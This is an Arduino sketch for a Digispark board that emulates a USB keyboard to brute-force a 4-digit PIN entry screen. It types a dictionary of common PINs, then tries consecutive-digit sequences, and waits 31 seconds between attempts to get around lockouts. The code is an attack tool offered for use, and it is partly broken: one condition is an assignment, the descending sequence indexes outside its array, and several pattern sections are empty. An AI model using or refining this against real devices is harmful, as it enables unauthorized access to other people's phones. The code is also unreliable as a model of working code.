#include "DigiKeyboard.h"

int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};

int pin_dict[20][4] = {{30, 31, 32, 33}, {30, 30, 30, 30}, {39, 39, 39, 39}, {30, 31, 30, 31}, {36, 36, 36, 36}, {30, 39, 39, 33}, {31, 39, 39, 39}, 
{33, 33, 33, 33}, {31, 31, 31, 31}, {35, 38, 35, 38}, {38, 38, 38, 38}, {32, 32, 32, 32}, {34, 34, 34, 34}, {35, 35, 35, 35}, {30, 30, 31, 31}, 
{30, 32, 30, 32}, {37, 37, 37, 37}, {31, 39, 39, 30}, {33, 32, 31, 30}, {30, 39, 30, 39}};

int a = 0; //1st digit
int b = 0; //2nd digit
int c = 0; //3rd digit
int d = 0; //4th digit
int count = 0;
int mode = 0; //Ascending Consecutives.

int dict_size = 20;
int dict_counter = 0;


//Setup
void setup()
{
  //Makes sure the PIN input field is working
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  delay(3000);
}
//Setup End


//Loop
void loop()
{
  //Waits for 31 seconds after the first 5 attempts and the 5 attempts after them. Then, waits for 31 seconds after each wrong attempt.
  if(count == 5 || count == 10 || count > 10)
  {
    digitalWrite(1,HIGH);
//    DigiKeyboard.sendKeyStroke(40); //Clicking OK to make the popup go away
    delay(31000);
    digitalWrite(1,LOW);
  }


  //Dictionaty Attack - Supplies values from the dictionary
  if (dict_size > 0)
  {
    DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][0]);
    DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][1]);
    DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][2]);
    DigiKeyboard.sendKeyStroke(pin_dict[dict_counter][3]);
    dict_counter++;
    dict_size--;
  }


  //Presses OK/Enter and delays for 1s before the next attempt
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);


  //Increases the counter to signal when the dictionary entries have ended (extra counts in case of missing input)
  if (dict_size != 0 && count < 30)
  {
    count++;
  }


  //Brute forcing based on the most common patterns
  if (dict_size == 0 || count >= 30)
  {
    //Consecutive Digits - 2345, 5678, 9876,...
    //Ascending
    if (mode == 0)
    {
      if (a <= 9)
      {
        DigiKeyboard.sendKeyStroke(num[a]);
        DigiKeyboard.sendKeyStroke(num[(a+1)%10]);
        DigiKeyboard.sendKeyStroke(num[(a+2)%10]);
        DigiKeyboard.sendKeyStroke(num[(a+3)%10]);
        a++;
      }
      else
      {
        mode = 1; //Descending Consecutives.
        a = 9;
      }
    }
    //Descending
    if (mode = 1)
    {
      if (a >= 0)
      {
        //Elaboration: sequences like 2109 are problematic, ((a-x)+10)%10 is applied to never access index < 0 and achieve descending cyclic order.
        DigiKeyboard.sendKeyStroke(num[a]);
        DigiKeyboard.sendKeyStroke(num[(a+9)%10]);
        DigiKeyboard.sendKeyStroke(num[(a-8%10)]);
        DigiKeyboard.sendKeyStroke(num[(a-7)%10]);
        a--; 
      }
      else
      {
        mode = 2; //Repeated Digits.
        a = 0;
      }
    }

    //Repeated Digits - 1122, 3322, 9900,....


    //Palindromic Digits - 1221, 3553, 5995,...


    //Alternating Digits - 1212, 3434, 9090,...
    
    if (count < 30)
      count++; 
  }
}
//Loop End
